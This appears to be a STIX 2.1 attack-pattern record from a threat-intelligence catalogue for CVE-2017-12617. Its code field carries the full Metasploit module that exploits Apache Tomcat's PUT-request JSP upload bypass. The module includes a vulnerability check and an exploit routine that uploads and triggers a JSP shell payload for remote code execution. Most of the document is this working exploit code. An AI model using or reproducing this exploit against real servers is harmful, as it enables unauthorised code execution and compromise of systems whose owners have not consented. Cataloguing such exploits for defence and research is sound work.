{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc26a04f-b380-4552-bf00-0169da80e23d",
    "created": "2024-08-14T17:08:01.547872Z",
    "modified": "2024-08-14T17:08:01.547876Z",
    "name": "Tomcat RCE via JSP Upload Bypass",
    "description": " This module uses a PUT request bypass to upload a jsp shell to a vulnerable Apache Tomcat configuration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/tomcat_jsp_upload_bypass.rb",
            "external_id": "tomcat_jsp_upload_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12617"
        },
        {
            "source_name": "reference",
            "url": "https://bz.apache.org/bugzilla/show_bug.cgi?id=61542"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Tomcat RCE via JSP Upload Bypass',\n        'Description' => %q{\n          This module uses a PUT request bypass to upload a jsp shell to a vulnerable Apache Tomcat configuration.\n        },\n        'Author' => 'peewpw',\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2017-12617' ],\n          [ 'URL', 'https://bz.apache.org/bugzilla/show_bug.cgi?id=61542' ],\n          [ 'EDB', '42966' ]\n        ],\n        'Privileged' => false,\n        'Platform' => %w[linux win], # others?\n        'Targets' => [\n          [\n            'Automatic',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Java Windows',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'win'\n            }\n          ],\n          [\n            'Java Linux',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n        'DisclosureDate' => '2017-10-03',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI path of the Tomcat installation', '/']),\n      Opt::RPORT(8080)\n    ])\n  end\n\n  def check\n    testurl = Rex::Text.rand_text_alpha(10)\n    testcontent = Rex::Text.rand_text_alpha(10)\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"#{testurl}.jsp/\"),\n      'method' => 'PUT',\n      'data' => \"<% out.println(\\\"#{testcontent}\\\");%>\"\n    })\n\n    res1 = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"#{testurl}.jsp\"),\n      'method' => 'GET'\n    })\n\n    if res1 && res1.body.include?(testcontent)\n      send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, \"#{testurl}.jsp/\"),\n        'method' => 'DELETE'\n      )\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Uploading payload...')\n    testurl = Rex::Text.rand_text_alpha(10)\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"#{testurl}.jsp/\"),\n      'method' => 'PUT',\n      'data' => payload.encoded\n    })\n    if res && res.code == 201\n      res1 = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, \"#{testurl}.jsp\"),\n        'method' => 'GET'\n      })\n      if res1 && res1.code == 200\n        print_status('Payload executed!')\n      else\n        fail_with(Failure::PayloadFailed, 'Failed to execute the payload')\n      end\n    else\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-10-03",
    "x_mitre_platforms": [
        "linux"
    ]
}